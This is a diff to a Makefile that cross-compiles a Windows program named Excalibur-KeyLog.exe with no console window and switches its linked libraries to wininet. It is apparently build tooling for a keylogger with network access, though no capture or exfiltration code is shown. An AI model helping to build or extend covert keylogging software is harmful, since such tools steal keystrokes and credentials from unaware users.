@@ -1,7 +1,9 @@
 CC = x86_64-w64-mingw32-gcc
 
 CC_FLAGS = -Wall -Wextra
-LD_FLAGS = -static-libgcc -static -lgdi32 -lole32 -lshell32 -lcomctl32 -luuid -lshlwapi
+LD_FLAGS = -static-libgcc -static -lwininet -lshlwapi
+
+INCLUDE_FLAGS = -I../
 
 SRC_DIR = src
 BIN_DIR = ../bin
@@ -12,8 +14,7 @@ OBJECTS = $(patsubst $(SRC_DIR)/%.c, $(OBJ_DIR)/%.o, $(SOURCES))
 
 TARGET = $(BIN_DIR)/Excalibur-KeyLog.exe
 
-include ../config.mk
-
+RELEASE := $(shell echo $(RELEASE))
 ifeq ($(RELEASE),1)
 	CC_FLAGS += -O2
 else
@@ -25,10 +26,10 @@ endif
 all: $(EXCALIBUR_OBJ) $(TARGET)
 
 $(OBJ_DIR)/%.o: $(SRC_DIR)/%.c
-	$(CC) $(CC_FLAGS) -c $< -o $@ $(LD_FLAGS)
+	$(CC) $(CC_FLAGS) -c $< -o $@ $(INCLUDE_FLAGS)
 
 $(TARGET): $(OBJECTS) 
-	$(CC) -mwindows $(CC_FLAGS) $^ -o $@ $(LD_FLAGS)
+	$(CC) -mwindows $(CC_FLAGS) $^ -o $@ $(LIBRARY_FLAGS) $(LD_FLAGS)
 
 $(OBJECTS): | $(OBJ_DIR)
 $(TARGET): | $(BIN_DIR)
